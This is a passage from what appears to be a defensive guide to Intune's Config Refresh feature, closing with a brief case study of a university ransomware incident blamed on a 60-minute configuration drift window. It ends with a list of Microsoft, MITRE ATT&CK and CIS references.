  - All within the 60-minute drift window
- **Impact:** 800GB of research data encrypted, $4.5M ransom
- **Recovery:** Took 6 weeks; Config Refresh frequency increased to 15 minutes university-wide
- **Reference:** [Cisa Alert - Ransomware in Education Sector](https://www.cisa.gov/alerts)

---

## References & Additional Resources

- [Microsoft Intune Configuration Profiles Documentation](https://learn.microsoft.com/en-us/mem/intune/configuration/)
- [Windows Policy CSP - Policy Configuration Service Provider](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp)
- [MITRE ATT&CK T1562 - Impair Defenses](https://attack.mitre.org/techniques/T1562/)
- [Config Refresh Feature Documentation](https://www.anoopcnair.com/config-refresh-windows-11-managed-mdm-intune/)
- [CIS Benchmarks - Windows 10/11](https://www.cisecurity.org/benchmark/windows)

---
